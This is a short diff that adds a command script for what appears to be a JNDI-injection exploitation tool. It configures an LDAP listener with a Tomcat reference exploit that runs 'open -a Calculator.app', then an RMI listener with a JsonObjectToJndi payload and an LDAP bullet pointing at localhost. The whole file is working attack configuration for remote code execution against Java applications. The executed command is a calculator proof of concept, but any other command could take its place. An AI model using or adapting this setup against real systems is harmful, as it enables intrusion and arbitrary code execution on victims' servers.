@@ -1,0 +1,12 @@
+use exploit LDAPTomcatRefListener
+set lport 1389
+set command "open -a Calculator.app"
+run
+
+use exploit RMIListener
+use payload JsonObjectToJndi
+use bullet LdapAttributeBullet
+set ldapURL ldap://127.0.0.1:1389
+set objectName test
+set lport 1099
+run
